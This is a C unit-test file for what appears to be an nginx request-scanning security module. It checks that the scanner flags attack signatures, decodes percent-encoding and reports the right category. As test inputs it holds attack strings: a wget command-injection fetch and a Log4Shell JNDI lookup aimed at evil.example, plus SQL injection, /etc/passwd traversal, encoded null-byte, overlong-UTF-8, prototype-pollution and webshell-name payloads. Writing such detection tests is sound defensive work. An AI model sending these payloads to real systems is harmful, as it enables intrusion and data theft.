/*
 * Copyright (C) 2026 Thijs Eilander
 * SPDX-License-Identifier: BSD-2-Clause
 *
 * Unit tests for the scan core (src/ngx_http_shield_scan.c).
 *
 * WHY THIS EXISTS ALONGSIDE ci/t/ AND ci/fuzz/
 *
 *   ci/t, Test::Nginx    drives the module through a live nginx. It proves the
 *                        request plumbing, but every case has to arrive as an
 *                        HTTP request, so a per-category skip mask or the
 *                        MATCH_RAW/MATCH_DECODED split is awkward to isolate.
 *   ci/fuzz/fuzz_scan.c  drives the same code with random bytes. It proves the
 *                        core does not CRASH, but a fuzzer asserts invariants,
 *                        not VALUES -- "this exact skip bit disables this exact
 *                        category" is not something it can state.
 *   this file            states values, at named boundaries, with no nginx
 *                        process and no network, in well under a second.
 *
 * It links the REAL src/ngx_http_shield_scan.c and the REAL nginx
 * src/core/ngx_string.c, src/core/ngx_palloc.c, src/os/unix/ngx_alloc.c (via
 * ci/tests/unit/run.sh), exactly as ci/fuzz/build.sh does for fuzz_scan. There
 * is deliberately NO shim reimplementation of ngx_unescape_uri() or
 * ngx_strlow(): the decoder is the thing most likely to disagree with what
 * nginx actually serves, and a test that asserts against a private copy of it
 * would assert only that the copy is self-consistent, which is worth nothing.
 *
 * ngx_http_shield_ac_build() needs a real ngx_pool_t (it calls ngx_pcalloc()
 * for the permanent tables and ngx_create_pool()/ngx_destroy_pool() for build
 * scratch), which is why ngx_palloc.c/ngx_alloc.c are linked rather than
 * stubbed. The test seam below injects only selected allocation failures;
 * every successful allocation still uses the real nginx implementation.
 *
 * PORTABILITY: keep every case free of host assumptions -- no sizeof-dependent
 * expected values, no signed-char comparisons, no pointer-width arithmetic in
 * an expectation. This is a CONVENTION, not something CI enforces: every job
 * in this repo runs amd64, where size_t is 8 bytes and char is signed.
 *
 * Extend: add a CASE() function and one line in main(). Keep each case
 * asserting a value the CORRECT implementation produces and a BROKEN one does
 * not -- ci/tests/unit/run.sh's header lists the mutations every case here was
 * seen red against.
 */

#include "ngx_http_shield_scan.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


/* Compile the exact core here to reach its file-local observation helper.
 * Only scan-core pcalloc calls cross this test seam; all successful calls
 * delegate to the real nginx allocator linked by run.sh. */
static ngx_pool_t  *allocation_pool;
static ngx_uint_t   allocation_call;
static ngx_uint_t   allocation_fail_at;

static void *scan_test_pcalloc(ngx_pool_t *pool, size_t size);

#define ngx_pcalloc scan_test_pcalloc
#include "../../../src/ngx_http_shield_scan.c"
#undef ngx_pcalloc

static void *
scan_test_pcalloc(ngx_pool_t *pool, size_t size)
{
    if (pool == allocation_pool && ++allocation_call == allocation_fail_at) {
        return NULL;
    }
    return ngx_pcalloc(pool, size);
}


static int  failures;
static int  checks;


static void
check(int ok, const char *what)
{
    checks++;
    if (ok) {
        printf("ok   %s\n", what);
        return;
    }
    printf("FAIL %s\n", what);
    failures++;
}


/* A real ngx_log_t writing nowhere -- ngx_create_pool()/ngx_palloc() require
 * one, and ngx_http_shield_ac_build() logs to it on a build failure. Output is
 * discarded by the ngx_log_error_core() stub below. */
static ngx_log_t  test_log;
static ngx_http_shield_automata_t  test_automata;

/*
 * Referenced by ngx_palloc.c's allocation-failure path and by
 * ngx_http_shield_ac_build()'s own ngx_log_error() calls. Mirrors
 * ci/fuzz/fuzz_scan.c's stub exactly: output is DISCARDED here, because the
 * loud failure path in this file is build_automata()'s abort() on
 * ngx_http_shield_ac_build() returning NGX_ERROR -- aborting inside the log
 * stub itself would turn every nginx-internal error log into a crash, which
 * is a wider contract than this harness wants.
 */
void
ngx_log_error_core(ngx_uint_t level, ngx_log_t *log, ngx_err_t err,
    const char *fmt, ...)
{
    (void) level; (void) log; (void) err; (void) fmt;
}

/*
 * ngx_string.c's ngx_sort() references ngx_cycle; nothing this file calls
 * reaches ngx_sort(), so the symbol only needs to exist to satisfy the
 * linker. Same stub as ci/fuzz/fuzz_scan.c.
 */
volatile ngx_cycle_t  *ngx_cycle;


/*
 * Build both production automata into a fresh pool, exactly as
 * ngx_http_shield_init() does at postconfiguration. Every case in this file
 * scans through these two automata -- there is no per-case rebuild, matching
 * how the module builds them once per nginx worker cycle.
 */
static void
build_automata(void)
{
    ngx_pool_t  *pool;

    /* Fatal diagnostics are best effort; abort even if stderr fails. */
    pool = ngx_create_pool(NGX_DEFAULT_POOL_SIZE, &test_log);
    if (pool == NULL) {
        (void) fprintf(stderr, "ngx_create_pool failed\n");
        abort();
    }

    if (ngx_http_shield_ac_build(pool, &test_log, &test_automata.decoded,
                                  NGX_HTTP_SHIELD_MATCH_DECODED)
        != NGX_OK)
    {
        (void) fprintf(stderr, "ac_build(DECODED) failed\n");
        abort();
    }

    if (ngx_http_shield_ac_build(pool, &test_log, &test_automata.raw,
                                  NGX_HTTP_SHIELD_MATCH_RAW)
        != NGX_OK)
    {
        (void) fprintf(stderr, "ac_build(RAW) failed\n");
        abort();
    }

    /* Deliberately never destroyed: the automata point into this pool and
     * must outlive every case in main(), same as the production cf->pool. */
}


/*
 * Scan a NUL-terminated C literal with the given skip mask. The core takes
 * (u_char *, len) and never looks for a terminator, so the length is the
 * string length -- never sizeof(), which would feed the NUL in as a scanned
 * byte and quietly change what the decoder sees at the end of the buffer.
 *
 * Scratch buffers are allocated exactly `len` bytes each, matching the
 * production call site's contract (ngx_http_shield_module.c allocates
 * scratch_lc/scratch_dec at exactly `len` from r->pool) -- a decoder that
 * ever wrote past `len` corrupts the adjacent malloc chunk here rather than
 * merely a private, oversized test buffer, so this harness can actually catch
 * that class of bug instead of silently absorbing it.
 */
static ngx_int_t
scan_str_mode(const char *s, uint64_t skip, size_t form_offset,
    ngx_http_shield_hit_t *hit)
{
    u_char                  *buf, *lc, *dec;
    size_t                   n;
    ngx_int_t                rc;
    ngx_http_shield_hit_t    local_hit;

    /* Poisoned on every call, whether or not this scan reports a match: a
     * caller that reads hit.cat/hit.category after a mutated scan_input()
     * that wrongly returns NGX_DECLINED (or any other path that skips
     * filling *hit) gets a deterministic, out-of-range sentinel instead of
     * a stack-garbage pointer -- the difference between a test that FAILs
     * cleanly and one that either segfaults inside libc's strcmp() or, worse,
     * silently PASSES a hit.cat check because the poison happens to alias a
     * real category's enum value (memset-to-zero would alias
     * NGX_HTTP_SHIELD_CAT_SQLI == 0, exactly the category most of this file's
     * fixtures target). NGX_HTTP_SHIELD_CAT_N is one past the last real
     * category and can never equal a genuine hit. */
    if (hit != NULL) {
        memset(hit, 0xff, sizeof(*hit));
        hit->cat = NGX_HTTP_SHIELD_CAT_N;
        hit->category = NULL;
    }

    n = strlen(s);

    if (n == 0) {
        /* scan_input returns NGX_DECLINED for len == 0 before touching the
         * scratch pointers at all, so NULL is safe and malloc(0) is avoided
         * (its behaviour is implementation-defined). */
        return ngx_http_shield_scan_input(
            &test_automata, NULL, 0, NULL, NULL, "test", form_offset, skip,
            hit != NULL ? hit : &local_hit);
    }

    buf = malloc(n);
    lc = malloc(n);
    dec = malloc(n);
    if (buf == NULL || lc == NULL || dec == NULL) {
        (void) fprintf(stderr, "scan_str_skip: OOM\n");
        abort();
    }
    memcpy(buf, s, n);

    rc = ngx_http_shield_scan_input(&test_automata, buf, n, lc, dec, "test", form_offset,
                                    skip,
                                    hit != NULL ? hit : &local_hit);

    free(buf);
    free(lc);
    free(dec);

    return rc;
}


static ngx_int_t
scan_str_skip(const char *s, uint64_t skip, ngx_http_shield_hit_t *hit)
{
    return scan_str_mode(s, skip, 0, hit);
}


static ngx_int_t
scan_str(const char *s, ngx_http_shield_hit_t *hit)
{
    return scan_str_skip(s, 0, hit);
}


/* --- cases ---------------------------------------------------------------- */

/*
 * The CLEAN baseline. This is the case that gives every other case in this
 * file meaning: a scanner that returned NGX_OK unconditionally would pass
 * every positive-hit case below, but it fails here.
 */
static void
case_clean_baseline(void)
{
    ngx_http_shield_hit_t  hit;

    check(ngx_http_shield_scan_input(&test_automata, NULL, 0, NULL, NULL,
                                     "test", 0, 0, &hit)
              == NGX_DECLINED,
          "(NULL, 0, ...) is declined, not a crash");

    check(scan_str("", &hit) == NGX_DECLINED, "empty input is declined");

    check(scan_str("hello world, this is an ordinary GET request path",
                    &hit)
              == NGX_DECLINED,
          "benign prose is declined");

    check(scan_str("/products/widget?color=blue&size=large", &hit)
              == NGX_DECLINED,
          "benign query string is declined");
}


static void
case_rule_term_count(void)
{
    size_t  i, total = 0;

    for (i = 0; i < NGX_HTTP_SHIELD_NRULES; i++) {
        total += ngx_http_shield_rules[i].nterms;
    }

    check(total == 12, "all six shipped AND rules contain 12 terms");
    check(NGX_HTTP_SHIELD_NRULE_TERMS == total,
          "compile-time term guard includes every live rule term");
    check(total <= 64, "live rule-term shifts fit the 64-bit mask");
}


static void
case_state_capacity(void)
{
    size_t  cap;

    cap = NGX_HTTP_SHIELD_AC_MAX_STATES - 1;
    check(ngx_http_shield_ac_capacity_add(&cap, 1) == NGX_OK,
          "state capacity accepts its last index");
    check(cap == NGX_HTTP_SHIELD_AC_MAX_STATES,
          "state capacity reaches the exact ceiling");
    check(ngx_http_shield_ac_capacity_add(&cap, 1) == NGX_ERROR,
          "state capacity rejects one past its ceiling");
    check(cap == NGX_HTTP_SHIELD_AC_MAX_STATES,
          "rejected state addition leaves capacity unchanged");

    cap = 1;
    check(ngx_http_shield_ac_capacity_add(&cap, (size_t) -1) == NGX_ERROR,
          "state capacity rejects a wrapping length");
    check(cap == 1, "wrapping length leaves capacity unchanged");

    cap = NGX_HTTP_SHIELD_AC_MAX_STATES + 1;
    check(ngx_http_shield_ac_capacity_add(&cap, 0) == NGX_ERROR,
          "state capacity rejects an already-invalid count");
    check(cap == NGX_HTTP_SHIELD_AC_MAX_STATES + 1,
          "invalid state count remains unchanged");
}


static void
case_definition_capacity(void)
{
    ngx_http_shield_sig_t      sigs[] = {{ "x", 1 }};
    ngx_http_shield_sig_t      terms[] = {{ "y", 1 }};
    ngx_http_shield_catdef_t   category = {
        NGX_HTTP_SHIELD_CAT_SQLI, "test", sigs, 1,
        NGX_HTTP_SHIELD_MATCH_DECODED
    };
    ngx_http_shield_ruledef_t  rule = {
        NGX_HTTP_SHIELD_CAT_SQLI, "test", terms, 1,
        NGX_HTTP_SHIELD_MATCH_DECODED
    };
    size_t                     cap;

    cap = 999;
    check(ngx_http_shield_ac_capacity(&test_log, &cap, &category, 1,
                                      &rule, 1, NGX_HTTP_SHIELD_MATCH_DECODED)
              == NGX_OK && cap == 3,
          "builder counts selected category and rule bytes plus the root");

    category.match = NGX_HTTP_SHIELD_MATCH_RAW;
    rule.match = NGX_HTTP_SHIELD_MATCH_RAW;
    check(ngx_http_shield_ac_capacity(&test_log, &cap, &category, 1,
                                      &rule, 1, NGX_HTTP_SHIELD_MATCH_DECODED)
              == NGX_OK && cap == 1,
          "builder skips definitions for the other buffer flavor");

    category.match = NGX_HTTP_SHIELD_MATCH_DECODED;
    sigs[0].len = NGX_HTTP_SHIELD_AC_MAX_STATES - 1;
    check(ngx_http_shield_ac_capacity(&test_log, &cap, &category, 1,
                                      &rule, 1, NGX_HTTP_SHIELD_MATCH_DECODED)
              == NGX_OK && cap == NGX_HTTP_SHIELD_AC_MAX_STATES,
          "builder accepts exactly the category state ceiling");
    sigs[0].len++;
    check(ngx_http_shield_ac_capacity(&test_log, &cap, &category, 1,
                                      &rule, 1, NGX_HTTP_SHIELD_MATCH_DECODED)
              == NGX_ERROR && cap == 1,
          "builder rejects an oversized category before increment");

    category.match = NGX_HTTP_SHIELD_MATCH_RAW;
    rule.match = NGX_HTTP_SHIELD_MATCH_DECODED;
    terms[0].len = NGX_HTTP_SHIELD_AC_MAX_STATES - 1;
    check(ngx_http_shield_ac_capacity(&test_log, &cap, &category, 1,
                                      &rule, 1, NGX_HTTP_SHIELD_MATCH_DECODED)
              == NGX_OK && cap == NGX_HTTP_SHIELD_AC_MAX_STATES,
          "builder accepts exactly the rule-term state ceiling");
    terms[0].len++;
    check(ngx_http_shield_ac_capacity(&test_log, &cap, &category, 1,
                                      &rule, 1, NGX_HTTP_SHIELD_MATCH_DECODED)
              == NGX_ERROR && cap == 1,
          "builder rejects an oversized rule term before increment");
}


/*
 * One positive hit per representative category, proving the automaton
 * actually reports the category it matched (hit.cat / hit.category) rather
 * than merely returning "some" verdict.
 */
static void
case_category_hits(void)
{
    ngx_http_shield_hit_t  hit;

    check(scan_str("id=1 union select username,password from users", &hit)
              == NGX_OK,
          "sqli signature matches");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_SQLI, "sqli hit reports CAT_SQLI");
    check(hit.category != NULL && strcmp(hit.category, "sqli") == 0,
          "sqli hit reports name \"sqli\"");

    check(scan_str("/download?file=../../../../etc/passwd", &hit) == NGX_OK,
          "traversal signature matches");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_TRAVERSAL,
          "traversal hit reports CAT_TRAVERSAL");

    check(scan_str(";wget http://evil.example/x.sh", &hit) == NGX_OK,
          "cmdi signature matches");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_CMDI, "cmdi hit reports CAT_CMDI");

    check(scan_str("payload=${jndi:ldap://evil.example/a}", &hit) == NGX_OK,
          "template (Log4Shell) signature matches");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_TEMPLATE,
          "template hit reports CAT_TEMPLATE");

    check(scan_str("/etc/passwd", &hit) == NGX_OK,
          "sensitive_file signature matches");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_SENSITIVE_FILE,
          "sensitive_file hit reports CAT_SENSITIVE_FILE");
}


/*
 * Percent-decoding: the whole reason the decoder is production code rather
 * than a raw substring pass. Each of these would be missed by scanning the
 * still-encoded bytes, which is precisely the bypass the decode stage exists
 * to close.
 */
static void
case_percent_decoding(void)
{
    ngx_http_shield_hit_t  hit;

    check(scan_str("id=1%20union%20select%20user%2cpass%20from%20users",
                    &hit)
              == NGX_OK,
          "fully percent-encoded sqli marker matches after one decode");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_SQLI,
          "decoded sqli hit still reports CAT_SQLI");

    check(scan_str("file=%2e%2e%2f%2e%2e%2fetc%2fpasswd", &hit) == NGX_OK,
          "percent-encoded traversal matches after one decode");

    /* Double-encoding is NOT decoded twice, and must not be: nginx decodes
     * once, so a module that decoded twice would match strings the server
     * itself never sees in that form -- a false positive and a divergence
     * from the bytes actually served. "%2575nion" decodes ONE level to the
     * literal text "%75nion", which contains neither "union select" (the
     * literal percent-escape is still in the way) nor any RAW-matched
     * signature, so the request must stay clean. */
    check(scan_str("id=1%2575nion%2520select%25201%252c1", &hit)
              == NGX_DECLINED,
          "double-encoded sqli marker does NOT match (single decode, "
          "like nginx)");

    /* nullbyte/overlong are matched against the RAW (still-encoded) buffer on
     * purpose -- see MATCH_RAW in ngx_http_shield_patterns.h. */
    check(scan_str("file=report.pdf%00.php", &hit) == NGX_OK,
          "encoded NUL matches against the raw buffer");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_NULLBYTE,
          "encoded-NUL hit reports CAT_NULLBYTE");

    check(scan_str("path=%c0%af%c0%aeetc", &hit) == NGX_OK,
          "overlong-UTF-8 traversal matches against the raw buffer");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_OVERLONG,
          "overlong hit reports CAT_OVERLONG");

    /* '+' folds to a literal space before the decoded scan, matching nginx's
     * own application/x-www-form-urlencoded convention. UNION requires a
     * token separator, so this matches only after the contextual fold. */
    check(scan_str("id=1+union+select+password", &hit) == NGX_OK,
          "'+' folds to a literal space, completing the sqli signature");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_SQLI,
          "'+'-folded sqli hit reports CAT_SQLI");
}


/*
 * shield_skip disables exactly the named category and nothing else: the same
 * input that matches with skip == 0 must go clean with that category's bit
 * set, and an UNRELATED category's bit must not affect it at all.
 */
static void
case_skip_mask(void)
{
    uint64_t                skip_sqli, skip_xss;
    ngx_http_shield_hit_t   hit;

    skip_sqli = (uint64_t) 1 << NGX_HTTP_SHIELD_CAT_SQLI;
    skip_xss = (uint64_t) 1 << NGX_HTTP_SHIELD_CAT_XSS;

    check(scan_str_skip("union select password from users", 0, &hit)
              == NGX_OK,
          "sqli matches with an empty skip mask");

    check(scan_str_skip("union select password from users", skip_sqli, &hit)
              == NGX_DECLINED,
          "skipping CAT_SQLI makes the same sqli input clean");

    check(scan_str_skip("union select password from users", skip_xss, &hit)
              == NGX_OK,
          "skipping an UNRELATED category (xss) leaves sqli matching");
}


/*
 * Case folding: scratch_lc is a full lowercase copy of the RAW bytes, and the
 * decoded copy is lowercased too (ngx_strlow(dec, dec, dlen) after decode).
 * Mixed case must fold byte-for-byte, not merely "look close".
 */
static void
case_case_folding(void)
{
    ngx_http_shield_hit_t  hit;

    check(scan_str("UNION SELECT password FROM users", &hit) == NGX_OK,
          "uppercase sqli marker matches (folded before match)");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_SQLI,
          "uppercase sqli hit still reports CAT_SQLI");

    check(scan_str("UnIoN SeLeCt PaSsWoRd FrOm users", &hit) == NGX_OK,
          "mixed-case sqli marker matches");

    /* RAW-matched categories fold too: raw_lc is ngx_strlow(data), so an
     * uppercased percent-escape digit must still hit nullbyte. Percent-escape
     * hex digits are conventionally uppercase in the wild ("%00" vs "%00" is
     * the same either way for digits, so use the overlong category, whose
     * signature contains lowercase hex LETTERS that only match if folded). */
    check(scan_str("path=%C0%AF%C0%AEetc", &hit) == NGX_OK,
          "uppercase-hex overlong escape matches (raw copy folded too)");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_OVERLONG,
          "folded overlong hit still reports CAT_OVERLONG");
}


/*
 * NUL bytes and malformed/truncated percent-escapes inside the buffer must
 * not crash or desynchronize the scan -- there is no length cap here (unlike
 * the skeleton's NGX_HTTP_SKEL_SCAN_MAX): the caller passes an exact byte
 * count and the decoder must honour exactly that many bytes, including an
 * embedded NUL that is not a C string terminator at all.
 */
static void
case_malformed_and_embedded_nul(void)
{
    static const u_char     embedded[] = "a\0b union select c";
    /* strlen() would stop at the embedded NUL; the true length is
     * sizeof(embedded) - 1 (drop the C string's own trailing NUL). */
    size_t                   elen = sizeof(embedded) - 1;
    u_char                  *buf, *lc, *dec;
    ngx_http_shield_hit_t    hit;
    ngx_int_t                rc;

    memset(&hit, 0xff, sizeof(hit));
    hit.cat = NGX_HTTP_SHIELD_CAT_N;
    hit.category = NULL;

    buf = malloc(elen);
    lc = malloc(elen);
    dec = malloc(elen);
    if (buf == NULL || lc == NULL || dec == NULL) {
        (void) fprintf(stderr, "case_malformed_and_embedded_nul: OOM\n");
        abort();
    }
    memcpy(buf, embedded, elen);

    rc = ngx_http_shield_scan_input(&test_automata, buf, elen, lc, dec,
                                    "test", 0, 0, &hit);
    check(rc == NGX_OK,
          "a literal embedded NUL does not truncate the scan -- the sqli "
          "marker AFTER it still matches");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_SQLI,
          "embedded-NUL scan still reports the correct category");

    free(buf);
    free(lc);
    free(dec);

    /* A truncated percent-escape at the very end of the buffer ("%2" with no
     * second hex digit, or a bare trailing "%") must decode to *something*
     * deterministic rather than reading past the buffer. ngx_unescape_uri()
     * treats an incomplete escape as literal trailing bytes; the point of
     * this check is that the call returns cleanly with no signature firing
     * from garbage past the end. */
    check(scan_str("plain text ending in a bare percent %", &hit)
              == NGX_DECLINED,
          "a trailing bare '%' does not crash and stays clean");
    check(scan_str("plain text ending in a truncated escape %2", &hit)
              == NGX_DECLINED,
          "a trailing truncated escape ('%2', one hex digit) does not crash "
          "and stays clean");
}


/*
 * The raw-vs-decoded automaton split (MATCH_RAW vs MATCH_DECODED) is a
 * behavioural property, not an implementation detail: overlong is RAW-only,
 * so its ENCODED form must match while the same bytes, once decoded to a
 * literal '/', must NOT re-trigger overlong (there is no bare-slash
 * signature in that category -- only the specific overlong escapes are
 * listed) -- proving the raw scan and the decoded scan are genuinely
 * different passes over different buffers, not one pass reused twice.
 */
static void
case_raw_vs_decoded_split(void)
{
    ngx_http_shield_hit_t  hit;

    check(scan_str("path=%c0%af%c0%aeetc", &hit) == NGX_OK,
          "overlong signature matches the RAW (still-encoded) buffer");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_OVERLONG,
          "overlong hit is reported, confirming the RAW automaton fired");

    /* Same semantic path (a traversal to /etc), spelled as a literal decoded
     * slash+dot instead of the overlong escapes: this must be caught by
     * ordinary traversal/sensitive_file matching on the DECODED buffer, not
     * by overlong -- overlong has no bare "/." signature. */
    check(scan_str("path=/./etc", &hit) == NGX_DECLINED,
          "the literal (non-overlong) spelling of the same path does not "
          "trigger overlong -- it has no bare '/.' signature");

    /* A DECODED-only category (sqli) must NOT be reachable through the RAW
     * automaton: percent-encoding a sqli marker so it never survives to the
     * decoded buffer as the marker (double-encoded, see case_percent_
     * decoding) proves the raw automaton does not carry sqli's signature set
     * at all -- if it did, the raw copy of the still-doubly-encoded text
     * could accidentally alias a signature. Re-asserted here from the split
     * angle: the raw buffer for a CLEAN plain-text sqli-shaped string must
     * not be scanned against decoded-only tables either. */
    check(scan_str("this text merely discusses union select syntax", &hit)
              == NGX_OK,
          "sanity: sqli terms in plain lowercase text still match "
          "decoded -- establishes the baseline case_raw_vs_decoded relies on");
}


/*
 * The category TIEBREAK: which category is reported when one automaton state
 * accepts more than one of them at once.
 *
 * ngx_http_shield_ac_build() unions output sets along the fail links
 * (out[v] |= out[fail[v]]), so a state ending a long signature ALSO accepts
 * every shorter signature that is a suffix of it -- including ones belonging
 * to a different category. ngx_http_shield_ac_scan() resolves that by taking
 * the lowest CATEGORY TABLE ROW, deliberately NOT the lowest bit position:
 * the bit tracks the enum, and the enum and ngx_http_shield_categories[] are
 * free to diverge.
 *
 * The fixture is a REAL cross-category suffix pair out of the shipped tables,
 * not a synthetic one -- there is no seam to inject signatures, the automata
 * are built from the production tables:
 *
 *   deserial  (table row 9)  "<java.lang.processbuilder"
 *   java_eval (table row 13)  "java.lang.processbuilder"
 *
 * The second is a proper suffix of the first and both are MATCH_DECODED, so
 * scanning the longer string lands on a state whose out[] mask carries BOTH
 * categories. Row 9 < row 13, so the correct engine reports deserial.
 *
 * WHY THIS CASE EXISTS: every other fixture in this file reaches its
 * accepting state by a path unique to one category's own table row, so the
 * tiebreak branch is never exercised by them -- inverting it left all 41
 * checks green. Confirmed non-vacuous on 2026-08-04 by applying that
 * inversion (`row < best` -> `row > best`, `best` initialized to 0) and
 * observing this case report java_eval (cat 13) instead of deserial (cat 9).
 *
 * If a future signature edit removes either literal, this case starts
 * asserting nothing rather than failing loudly -- so it checks BOTH that the
 * multi-accept state is genuinely reached (the java_eval suffix alone still
 * reports java_eval) and that the shared state resolves to deserial. The
 * first check is what detects the fixture having gone stale.
 */
static void
case_category_tiebreak(void)
{
    ngx_http_shield_hit_t  hit;

    /* Fixture liveness: the SHORTER signature on its own must still report
     * its own category. If this ever fails, the pair below stopped being a
     * shared-suffix pair and the tiebreak assertion has gone vacuous. */
    check(scan_str("x=java.lang.processbuilder", &hit) == NGX_OK,
          "tiebreak fixture: the java_eval suffix alone still matches");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_JAVA_EVAL,
          "tiebreak fixture: the suffix alone reports CAT_JAVA_EVAL");

    /* The tiebreak itself: the longer deserial signature ends at a state that
     * accepts java_eval too. The lower TABLE ROW (deserial) must win. */
    check(scan_str("x=<java.lang.processbuilder", &hit) == NGX_OK,
          "a state accepting two categories still reports a match");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_DESERIAL,
          "the multi-category state resolves to the LOWEST table row "
          "(deserial, row 9), not the highest (java_eval, row 13)");
    check(hit.category != NULL && strcmp(hit.category, "deserial") == 0,
          "the tiebreak winner's NAME is reported, not the loser's");

    /* Skipping the winner must hand the hit to the OTHER category rather than
     * going clean: ~skip is applied to out[] BEFORE the tiebreak runs, so a
     * skipped category can neither be reported nor mask a live one sharing
     * its state. This distinguishes "the tiebreak picked deserial" from "only
     * deserial was ever a candidate". */
    check(scan_str_skip("x=<java.lang.processbuilder",
                         (uint64_t) 1 << NGX_HTTP_SHIELD_CAT_DESERIAL, &hit)
              == NGX_OK,
          "skipping the tiebreak winner leaves the shared state matching");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_JAVA_EVAL,
          "with deserial skipped, the same state reports the runner-up "
          "(java_eval) -- proving both categories really accept there");
}


/* Flight reference gadgets, independent of the attacker's chunk number. */
static void
case_react_flight_gadgets(void)
{
    ngx_http_shield_hit_t  hit;
    const char           *attacks[] = {
        "$1:__proto__:then",
        "$ab:constructor:constructor",
        "$2:__PROTO__:THEN",
        "%243%3Aconstructor%3Aconstructor",
        "$4:__proto__:constructor:constructor",
        ":__proto__:then",
        ":constructor:constructor"
    };
    const char           *clean[] = {
        "{\"then\":\"$@1\",\"value\":\"$2:profile:name\"}",
        "{\"__proto__\":null,\"constructor\":\"Widget\",\"then\":true}",
        "$1:__proto__:theme",
        "$1:constructor:construct",
        "$1:constructor",
        "$1:__proto__"
    };
    size_t                i;

    for (i = 0; i < sizeof(attacks) / sizeof(attacks[0]); i++) {
        check(scan_str(attacks[i], &hit) == NGX_OK,
              "Flight gadget matches without a fixed chunk number");
        check(hit.cat == NGX_HTTP_SHIELD_CAT_DESERIAL,
              "Flight gadget reports deserial");
        check(scan_str_skip(attacks[i],
                  (uint64_t) 1 << NGX_HTTP_SHIELD_CAT_DESERIAL, &hit)
                  == NGX_DECLINED,
              "Flight gadget respects deserial skip");
    }
    for (i = 0; i < sizeof(clean) / sizeof(clean[0]); i++) {
        check(scan_str(clean[i], &hit) == NGX_DECLINED,
              "ordinary Flight references and individual keys stay clean");
    }
}


static void
case_plus_context(void)
{
    ngx_http_shield_hit_t hit;
    uint64_t body_skip = ngx_http_shield_no_body_mask();
    static const struct {
        const char *input;
        size_t offset;
        ngx_int_t expected;
    } cases[] = {
        {"chmod +x", 0, NGX_DECLINED},
        {"chmod+%2Bx", 0, NGX_OK},
        {"chmod%20%2bx", 0, NGX_OK},
        {"chmod%20+x", 0, NGX_DECLINED},
        {"chmod +x", 8, NGX_OK},
        {"/chmod%20+x?q=ok", 12, NGX_OK},
        {"/ok?q=chmod+%2Bx", 4, NGX_OK},
        {"/ok?q=chmod++x", 4, NGX_DECLINED},
        {"chmod%20%2", 0, NGX_DECLINED},
        {"chmod%20%GGx", 0, NGX_DECLINED},
        {"a+b=ordinary", 0, NGX_DECLINED},
        {"a+b=ordinary", 12, NGX_DECLINED},
        {"x' or%2B1=1--", 0, NGX_OK},
        {"x' or+1=1--", 13, NGX_OK},
        {"file=report.pdf%00.php", 0, NGX_OK},
        {"file=report.pdf%00.php", 22, NGX_OK}
    };
    size_t i;

    for (i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
        check(scan_str_mode(cases[i].input, 0, cases[i].offset, &hit)
                  == cases[i].expected, cases[i].input);
    }
    check(scan_str_mode("chmod+%2Bx",
              (uint64_t) 1 << NGX_HTTP_SHIELD_CAT_CMDI, 0, &hit)
              == NGX_DECLINED, "cmdi normalization preserves skip");
    check(scan_str_mode("cmd=chmod +x", body_skip, 0, &hit) == NGX_DECLINED,
          "body policy skips cmdi after form plus normalization");
    check(scan_str_mode("cmd=chmod +x", body_skip, strlen("cmd=chmod +x"),
                        &hit) == NGX_DECLINED,
          "body policy skips cmdi with a literal plus");
    check(scan_str_mode("id=x' or+1=1--", body_skip, 0, &hit) == NGX_OK,
          "body-enabled sqli hits after form plus normalization");
    check(scan_str_mode("id=x' or+1=1--", body_skip,
                        strlen("id=x' or+1=1--"), &hit) == NGX_OK,
          "body-enabled sqli hits with a literal unary plus");
}


static void
case_body_base64_collisions(void)
{
    static const char *bare[] = {
        "ro0ab", "b374k", "p0wny", "gel4y", "wpyii2", "smevk", "xleet"
    };
    static const char *contextual[] = {
        "ro0abxny", "ro0abxvy", "b374k.php", "p0wny.php", "gel4y.php",
        "wpyii2.php", "smevk.php", "xleet.php"
    };
    static const char *variant = "p0wny-shell.php";
    static const char alphabet[] =
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/";
    char sample[8193];
    ngx_http_shield_hit_t hit;
    uint32_t state = 0x5eed1234U;
    uint64_t body_skip = ngx_http_shield_no_body_mask();
    size_t i, j, context_len, context_offset;

    for (i = 0; i < sizeof(bare) / sizeof(bare[0]); i++) {
        check(scan_str_mode(bare[i], body_skip, strlen(bare[i]), &hit)
                  == NGX_DECLINED, "bare base64-collision token is body-clean");
        check(scan_str_mode(contextual[i], body_skip, strlen(contextual[i]), &hit)
                  == NGX_OK, "contextual serialization/webshell token still hits");
    }
    check(scan_str_mode(variant, body_skip, strlen(variant), &hit) == NGX_OK,
          "common p0wny-shell filename variant still hits");
    check(scan_str_mode("ro0abxvy", body_skip, strlen("ro0abxvy"), &hit)
              == NGX_OK,
          "Java serialization array-root context still hits");
    for (i = 0; i < 10000; i++) {
        for (j = 0; j < sizeof(sample) - 1; j++) {
            state ^= state << 13;
            state ^= state >> 17;
            state ^= state << 5;
            sample[j] = alphabet[state & 63U];
        }
        sample[sizeof(sample) - 1] = '\0';
        if (scan_str_mode(sample, body_skip, sizeof(sample) - 1, &hit) != NGX_DECLINED) {
            check(0, "10k seeded 8KiB base64 bodies have zero signature hits");
            return;
        }
        context_len = strlen(contextual[i % (sizeof(contextual)
                                              / sizeof(contextual[0]))]);
        context_offset = (i * 7919U) % (sizeof(sample) - 1 - context_len);
        ngx_memcpy(sample + context_offset,
                   contextual[i % (sizeof(contextual)
                                    / sizeof(contextual[0]))],
                   context_len);
        if (scan_str_mode(sample, body_skip, sizeof(sample) - 1, &hit) != NGX_OK) {
            check(0, "10k context-injected base64 bodies all hit");
            return;
        }
    }
    check(1, "10k seeded 8KiB base64 bodies have zero signature hits");
